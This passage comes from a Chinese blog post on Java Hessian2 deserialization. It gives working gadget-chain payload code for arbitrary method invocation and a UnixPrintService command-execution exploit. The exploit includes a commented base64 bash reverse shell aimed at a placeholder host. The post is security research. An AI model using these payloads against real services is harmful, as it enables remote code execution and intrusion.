<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute2</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">        <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">        Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">        uiDefaults2.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(uiDefaults2);</span><br><span class="line">        <span class="comment">// 设置一个人畜无害内容</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(hotSwappableTargetSource1,hotSwappableTargetSource1);</span><br><span class="line">        hashMap.put(hotSwappableTargetSource2,hotSwappableTargetSource2);</span><br><span class="line">        <span class="comment">// 反射修改回来</span></span><br><span class="line">        Reflections.setFieldValue(hotSwappableTargetSource2,<span class="string">&quot;target&quot;</span>,uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(hashMap);</span><br><span class="line">        oo.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><p>这里我尝试使用手动添加冲突的方式去触发equals方法，可能看上去和payload1相同，实质上也相同，只是这个更完善了。但是操作起来稍微麻烦一丢丢，因为 UIDefaults 本身就是一个 hashtable，反射去修改其值比较麻烦，然后外层嵌套了一个HashMap，然后又套了一个Hashtable，这几个都不好反射去修改。使用payload1通过反射的方式进行hash值的设置（之前好像有出现过此类场景，但是现在想来，还是这个方便），就与该payload相同了，如果校验本身比较简单且容易相等，可以不用这种方式。</p>
<p>我仿造反射构造 HashMap 写了一个构造 HashTable 的方法，这样在向最外面的Hashtable中填充时，就不会有本地触发的风险了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">NoLocalExecuteTable</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        Reflections.setFieldValue(hashtable, <span class="string">&quot;count&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.Hashtable$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.Hashtable$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(hashtable, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>通过这种方式，我们可以构造一个不会本地触发的 hashtable</p>
<p>最终payload</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute3</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">        <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">        Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">        uiDefaults2.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,uiDefaults);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,uiDefaults2);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,uiDefaults);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,uiDefaults2);</span><br><span class="line">        Hashtable hashtable= Reflections.NoLocalExecuteTable(map1,map2);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(hashtable);</span><br><span class="line">        oo.flush();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这个实际上本质上是 payload1，这里的两个hashMap省去，创建hashtable的方法变为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashtable hashtable= Reflections.NoLocalExecuteTable(uiDefaults,uiDefaults2);</span><br></pre></td></tr></table></figure></div>

<p>这样就与payload1相同了，但是假如payload1中的两个类的hashcode方法返回的值不同，就没法触发payload，所以这个方式虽然多了几步，但是能保证类的hash判断通过。</p>
<h2 id="payload4"><a href="#payload4" class="headerlink" title="payload4"></a>payload4</h2><p>在 Hessian2 的情况下，没有黑名单，以下四个类均可使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XStringForFSB</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString</span><br><span class="line"># dubbo 中该类已被禁用但是其它地方可用于代替上面两项</span><br><span class="line">javax.sound.sampled.AudioFileFormat</span><br><span class="line">javax.sound.sampled.AudioFormat</span><br></pre></td></tr></table></figure></div>

<p>通过这些可以去触发 equals 方法，最后可以触发对应部分的toString方法，可以配合上之前的两个 toString 类。</p>
<p>这里我就使用上面的手动设置冲突的方式去触发equals方法了。（用直接创hashMap的方式，可能在hash校验时不通过，还得反射区进行修改，然后第二个需要spring依赖，于是选用第三个了。）</p>
<p>最终payload</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">originalSerialize_Execute4</span><span class="params">(String className, String methodName, Object[] args,<span class="type">int</span> payloadChoose)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ml</span> <span class="operator">=</span>AnyStaticMethodExec3(className,methodName,args);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (payloadChoose)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                o = <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                o = <span class="keyword">new</span> <span class="title class_">XStringForFSB</span>(<span class="keyword">new</span> <span class="title class_">FastStringBuffer</span>(),<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                o = Reflections.createWithoutConstructor(AudioFileFormat.Type.class);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                o = Reflections.createWithoutConstructor(AudioFormat.Encoding.class);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                o = <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,o);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,ml);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,o);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,ml);</span><br><span class="line">        Hashtable hashtable= Reflections.NoLocalExecuteTable(map1,map2);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">oo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        oo.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        oo.writeObject(hashtable);</span><br><span class="line">        oo.flush();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bai);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="🚩特定情况下命令执行-–-UnixPrintService"><a href="#🚩特定情况下命令执行-–-UnixPrintService" class="headerlink" title="🚩特定情况下命令执行 – UnixPrintService"></a>🚩特定情况下命令执行 – UnixPrintService</h2><p>参考：<a class="link"   target="_blank" rel="noopener" href="https://aecous.github.io/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/#%E7%BB%93%E5%90%88%E5%85%B6%E4%BB%96%E4%BE%9D%E8%B5%96%E7%9A%84%E6%8B%93%E5%B1%95" >初探UnixPrintService | Prove yourself (aecous.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/kingbridge/articles/17020853.html" >使用tabby对CVE-2022-39198的挖掘尝试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>利用 <code>sun.print.UnixPrintService</code> 可直接执行命令。</p>
<p>这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令（因为UnixPrintService中存在多个getter，所以命令会执行多次）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1651142700263.png"
                      alt="img"
                ></p>
<p><strong>也是非常直观，可以直接利用。但只可惜这个类在高版本被移除，并仅支持 Unix&#x2F;类Unix 操作系统（如Linux）。</strong></p>
<p>总体看下来其实这个方法还是较为鸡肋的：</p>
<p>【缺点1】未实现序列化接口，目前只能在 hessian2 这个特殊的反序列化玩意里面用。（个人感觉最大缺点）</p>
<p>【缺点2】高版本java已移除</p>
<p>【缺点3】需要不存在CUPS服务，而许多linux 如 ubuntu 默认开启（docker中不存在，可以通过访问<code>http://127.0.0.1:631/</code>看看是否开启）。</p>
<p>感觉限制比较大，就不做具体分析了，只要满足版本条件，再去找一个 getter trigger 就行了。</p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_UnixPrintServiceLookup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.utils.FastStringBuffer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XStringForFSB;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintServiceLookup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sound.sampled.AudioFileFormat;</span><br><span class="line"><span class="keyword">import</span> javax.sound.sampled.AudioFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">use_UnixPrintServiceLookup</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnixPrintServiceLookup</span> <span class="variable">unixPrintServiceLookup</span> <span class="operator">=</span> Reflections.createWithoutConstructor(UnixPrintServiceLookup.class);</span><br><span class="line">        Reflections.setFieldValue(unixPrintServiceLookup, <span class="string">&quot;cmdIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        Reflections.setFieldValue(unixPrintServiceLookup, <span class="string">&quot;osname&quot;</span>, <span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line"><span class="comment">//        String cmd = &quot;;bash -c &#x27;&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3h4eDwmMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;mousepad&quot;</span>;</span><br><span class="line">        Reflections.setFieldValue(unixPrintServiceLookup, <span class="string">&quot;lpcFirstCom&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;Ko1sh1&quot;</span>,unixPrintServiceLookup);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">trigger</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                trigger = <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                trigger = <span class="keyword">new</span> <span class="title class_">XStringForFSB</span>(<span class="keyword">new</span> <span class="title class_">FastStringBuffer</span>(),<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                trigger = Reflections.createWithoutConstructor(AudioFileFormat.Type.class);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                trigger = Reflections.createWithoutConstructor(AudioFormat.Encoding.class);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,jsonObject);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,trigger);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,trigger);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,jsonObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Reflections.NoLocalExecuteMap(map1,map2);</span><br><span class="line">        Hessian2_OnlyJDK_Tool.evilGenerate(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>




















        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> Hessian2 反序列化</li>
        <li><strong>作者:</strong> Ko1sh1</li>
        <li><strong>创建于
                :</strong> 2023-05-20 05:18:02</li>
        
            <li>
                <strong>更新于
                    :</strong> 2024-05-30 21:38:43
            </li>
        
        <li>
            <strong>链接:</strong> https://ko1sh1.github.io/2023/05/20/blog_hessian2 反序列化/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#java 反序列化</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2023/10/02/blog_Redis%E5%AE%89%E5%85%A8/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Redis 安全</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2023/05/11/blog_pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">pickle 反序列化漏洞</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        评论
    </div>
    

        
            
    <div class="twikoo-container">
        <script data-swup-reload-script
                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
        ></script>
        <div id="twikoo-comment"></div>
        <script data-swup-reload-script>
            function loadTwikoo() {
                twikoo.init({
                    el: '#twikoo-comment',
                    envId: 'https://ko1sh1-blog-comments.hf.space',
                });
            }

            if ('true') {
                const loadTwikooTimeout = setTimeout(() => {
                    loadTwikoo();
                    clearTimeout(loadTwikooTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadTwikoo);
            }
        </script>
    </div>


        
        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">此页目录</div>
        <div class="page-title">Hessian2 反序列化</div>
